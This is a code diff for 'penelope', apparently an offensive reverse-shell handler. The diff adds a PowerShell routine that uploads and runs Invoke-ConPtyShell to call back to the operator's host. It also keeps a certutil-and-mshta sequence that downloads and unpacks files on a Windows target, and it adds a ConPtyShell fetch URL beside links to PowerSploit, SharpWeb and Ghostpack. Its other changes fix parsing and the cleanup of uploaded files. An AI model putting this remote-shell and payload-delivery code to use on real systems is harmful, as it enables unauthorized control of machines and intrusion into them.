@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.18.2"
+__version__ = "0.18.3"
 
 import os
 import io
@@ -1201,7 +1201,15 @@ class MainMenu(BetterCMD):
 		Upgrade the current session's shell to PTY
 		Note: By default this is automatically run on the new sessions. Disable it with -U
 		"""
-		core.sessions[self.sid].upgrade()
+		session = core.sessions[self.sid]
+		if session.OS == 'Unix':
+			session.upgrade()
+		else:
+			if session.subtype == 'psh':
+				conptyshell_path = session.upload(URLS['conptyshell'], remote_path=session.tmp)[0]
+				session.exec(f"iex(get-content {conptyshell_path} -raw); Invoke-ConPtyShell -RemoteIp {session._host} -RemotePort {session._port} -Rows 24 -Cols 80")
+			else:
+				logger.warning("Powershell session is needed")
 
 	def do_dir(self, ID):
 		"""
@@ -2278,9 +2286,9 @@ class Session:
 				match = re.search(pattern, self.systeminfo, re.MULTILINE)
 				return match.group(1).replace(" ", "_").rstrip() if match else ''
 
-			self.hostname = extract_value(r"^Host Name:\s+(.+)")
-			self.system = extract_value(r"^OS Name:\s+(.+)")
-			self.arch = extract_value(r"^System Type:\s+(.+)")
+			self.hostname = extract_value(r"^Host Name:\s+(.+)").split('\x1b')[0]
+			self.system = extract_value(r"^OS Name:\s+(.+)").split('\x1b')[0]
+			self.arch = extract_value(r"^System Type:\s+(.+)").split('\x1b')[0]
 
 		return True
 
@@ -2308,6 +2316,8 @@ class Session:
 
 		elif self.OS == 'Windows':
 			response = self.exec("whoami", force_cmd=True, value=True)
+			if "\n" in response:
+				response = response.splitlines()[-1] # conptyshell
 
 		return response or ''
 
@@ -3725,12 +3735,12 @@ class Session:
 
 			urlpath_zip = server.add(tempfile_zip)
 
-			cwd_escaped = self.cwd.replace('\\', '\\\\')
+			dst_escaped = destination.replace('\\', '\\\\')
 			tmp_escaped = self.tmp.replace('\\', '\\\\')
 			temp_remote_file_zip = urlpath_zip.split("/")[-1]
 
 			fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
-			unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{cwd_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'
+			unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{dst_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'
 
 			with open(tempfile_bat, "w") as f:
 				f.write(fetch_cmd + "\n")
@@ -3743,6 +3753,7 @@ class Session:
 				force_cmd=True, value=True, timeout=None)
 			server.stop()
 			server.term.wait(options.short_timeout)
+
 			if not response:
 				logger.error("Upload initialization failed...")
 				return []
@@ -4847,7 +4858,7 @@ class cleanup(Module):
 		"""
 		Remove uploaded files and directories from the target
 		"""
-		for item in session.uploaded_paths:
+		for item in list(session.uploaded_paths.keys()):
 			p = item.strip('"').strip("'")
 			if session.OS == 'Unix':
 				response = session.exec(f'[ -e "{p}" ] && echo "exists" || echo "no"', value=True)
@@ -4855,6 +4866,7 @@ class cleanup(Module):
 					response = session.exec(f'rm -rf -- "{p}";echo $?', value=True)
 					if response == '0':
 						logger.info(f"Deleted '{p}'")
+						del session.uploaded_paths[item]
 					else:
 						logger.error(f"Error deleting '{p}'")
 				else:
@@ -4862,7 +4874,10 @@ class cleanup(Module):
 			else:
 				response = session.exec(f'cmd /Q /D /C if exist "{p}" (echo exists) else (echo no)', force_cmd=True, value=True)
 				if response == 'exists':
-					session.exec(f'set "RM_PATH={p}"', value=True, force_cmd=True)
+					if session.subtype == 'cmd':
+						session.exec(f'set "RM_PATH={p}"')
+					elif session.subtype == 'psh':
+						session.exec(f'$env:RM_PATH = "{p}"')
 					session.exec(
 						'cmd /Q /D /C if exist "%RM_PATH%\\*" (rd /s /q "%RM_PATH%") else (del /f /q "%RM_PATH%")',
 						value=True, force_cmd=True
@@ -4872,12 +4887,13 @@ class cleanup(Module):
 						value=True, force_cmd=True
 					)
 					if deleted == '0':
-						logger.info(f"Deleted '{item}'")
+						logger.info(f"Deleted '{p}'")
+						del session.uploaded_paths[item]
 					else:
-						logger.error(f"Error deleting '{item}'")
-					session.exec('set "RM_PATH="', value=True, force_cmd=True)
+						logger.error(f"Error deleting '{p}'")
+
 				else:
-					logger.error(f"'{item}' does not exist anymore")
+					logger.error(f"'{p}' does not exist anymore")
 
 class FileServer:
 	def __init__(self, *items, port=None, host=None, url_prefix=None, quiet=False):
@@ -5589,6 +5605,7 @@ URLS = {
 	'powerview':		"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1",
 	'sharpweb':		"https://github.com/djhohnstein/SharpWeb/releases/download/v1.2/SharpWeb.exe",
 	'ghostpack':		"https://codeload.github.com/r3motecontrol/Ghostpack-CompiledBinaries/zip/20a5f0a81456358b2bdc9846774949a7fb25acd8",
+	'conptyshell':		"https://raw.githubusercontent.com/antonioCoco/ConPtyShell/refs/heads/master/Invoke-ConPtyShell.ps1",
 }
 EMOJIS = {
 	'folder':'📁', 'file':'📄', 'invalid_shell':'🙄', 'new_shell':'😍️', 'target':'🎯', 'upgrade':'💪', 'logfile':'📜',
